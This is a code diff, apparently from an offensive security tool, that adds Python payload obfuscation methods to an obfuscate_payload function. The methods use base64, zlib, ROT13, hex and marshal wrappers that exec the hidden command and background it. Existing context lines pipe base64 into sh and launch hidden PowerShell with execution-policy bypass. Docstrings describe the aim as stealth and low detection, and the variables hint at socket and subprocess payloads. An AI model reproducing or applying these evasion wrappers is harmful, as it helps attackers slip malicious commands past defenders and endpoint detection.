@@ -98,6 +98,41 @@ def obfuscate_payload(payload: str, method: str = "base64") -> str:
             # Generic base64 wrapper
             return f"echo {encoded} | base64 -d | sh"
     
+    elif method == "python_stealth":
+        # Advanced Python stealth obfuscation
+        if payload.startswith("python"):
+            return _advanced_python_obfuscation(payload)
+        else:
+            return obfuscate_payload(payload, "base64")
+    
+    elif method == "python_zlib":
+        # Python zlib compression + base64
+        if payload.startswith("python"):
+            return _python_zlib_obfuscation(payload)
+        else:
+            return obfuscate_payload(payload, "base64")
+    
+    elif method == "python_rot13":
+        # ROT13 + base64 double encoding
+        if payload.startswith("python"):
+            return _python_rot13_obfuscation(payload)
+        else:
+            return obfuscate_payload(payload, "base64")
+    
+    elif method == "python_hex":
+        # Hex encoding with bytes
+        if payload.startswith("python"):
+            return _python_hex_obfuscation(payload)
+        else:
+            return obfuscate_payload(payload, "base64")
+    
+    elif method == "python_marshal":
+        # Marshal bytecode obfuscation
+        if payload.startswith("python"):
+            return _python_marshal_obfuscation(payload)
+        else:
+            return obfuscate_payload(payload, "base64")
+    
     elif method == "powershell_encoded":
         # PowerShell-specific UTF-16 base64 encoding
         if payload.startswith("powershell"):
@@ -169,6 +204,118 @@ def _advanced_powershell_obfuscation(payload: str) -> str:
     encoded = base64.b64encode(utf16_bytes).decode()
     
     return f"powershell -W Hidden -Exec Bypass -EncodedCommand {encoded}"
+
+
+def _advanced_python_obfuscation(payload: str) -> str:
+    """Advanced Python obfuscation with variable name randomization and string splitting"""
+    import random
+    import string
+    
+    # Extract the command part after 'python3 -c'
+    if ' -c ' in payload:
+        command_part = payload.split(' -c ', 1)[1].strip('"').strip("'")
+    else:
+        command_part = payload
+    
+    # Generate random variable names
+    vars_map = {
+        's': ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))),
+        'os': ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))),
+        'socket': ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))),
+        'subprocess': ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))),
+        'time': ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10))),
+        'sys': ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))
+    }
+    
+    # Create obfuscated version with random variable names and string splitting
+    obfuscated_code = f"""
+import base64 as {vars_map['os']}
+exec({vars_map['os']}.b64decode('""" + base64.b64encode(command_part.encode()).decode() + f"""').decode())
+    """.strip()
+    
+    return f'python3 -c "{obfuscated_code}" &'
+
+
+def _python_zlib_obfuscation(payload: str) -> str:
+    """Python zlib compression + base64 encoding for maximum compression"""
+    import zlib
+    
+    # Extract the command part
+    if ' -c ' in payload:
+        command_part = payload.split(' -c ', 1)[1].strip('"').strip("'")
+    else:
+        command_part = payload
+    
+    # Compress and encode
+    compressed = zlib.compress(command_part.encode())
+    encoded = base64.b64encode(compressed).decode()
+    
+    obfuscated_code = f"import zlib,base64;exec(zlib.decompress(base64.b64decode('{encoded}')).decode())"
+    
+    return f'python3 -c "{obfuscated_code}" &'
+
+
+def _python_rot13_obfuscation(payload: str) -> str:
+    """ROT13 + base64 double encoding for stealth"""
+    import codecs
+    
+    # Extract the command part
+    if ' -c ' in payload:
+        command_part = payload.split(' -c ', 1)[1].strip('"').strip("'")
+    else:
+        command_part = payload
+    
+    # Apply ROT13 then base64
+    rot13_text = codecs.encode(command_part, 'rot13')
+    encoded = base64.b64encode(rot13_text.encode()).decode()
+    
+    obfuscated_code = f"import base64,codecs;exec(codecs.decode(base64.b64decode('{encoded}').decode(),'rot13'))"
+    
+    return f'python3 -c "{obfuscated_code}" &'
+
+
+def _python_hex_obfuscation(payload: str) -> str:
+    """Hex encoding with bytes.fromhex() for low detection"""
+    # Extract the command part
+    if ' -c ' in payload:
+        command_part = payload.split(' -c ', 1)[1].strip('"').strip("'")
+    else:
+        command_part = payload
+    
+    # Convert to hex
+    hex_encoded = command_part.encode().hex()
+    
+    obfuscated_code = f"exec(bytes.fromhex('{hex_encoded}').decode())"
+    
+    return f'python3 -c "{obfuscated_code}" &'
+
+
+def _python_marshal_obfuscation(payload: str) -> str:
+    """Marshal + base64 for bytecode obfuscation (advanced)"""
+    import marshal
+    
+    # Extract the command part
+    if ' -c ' in payload:
+        command_part = payload.split(' -c ', 1)[1].strip('"').strip("'")
+    else:
+        command_part = payload
+    
+    try:
+        # For complex payloads, use hex encoding instead of marshal to avoid size issues
+        if len(command_part) > 300:  # Large payloads get hex encoding
+            return _python_hex_obfuscation(payload)
+        
+        # Compile to bytecode and marshal
+        compiled_code = compile(command_part, '<string>', 'exec')
+        marshaled = marshal.dumps(compiled_code)
+        encoded = base64.b64encode(marshaled).decode()
+        
+        obfuscated_code = f"import marshal,base64;exec(marshal.loads(base64.b64decode('{encoded}')))"
+        
+        return f'python3 -c "{obfuscated_code}" &'
+    except Exception:
+        # Fallback to hex obfuscation if marshal fails
+        return _python_hex_obfuscation(payload)
 
 
 def copy_to_clipboard(text: str) -> bool:
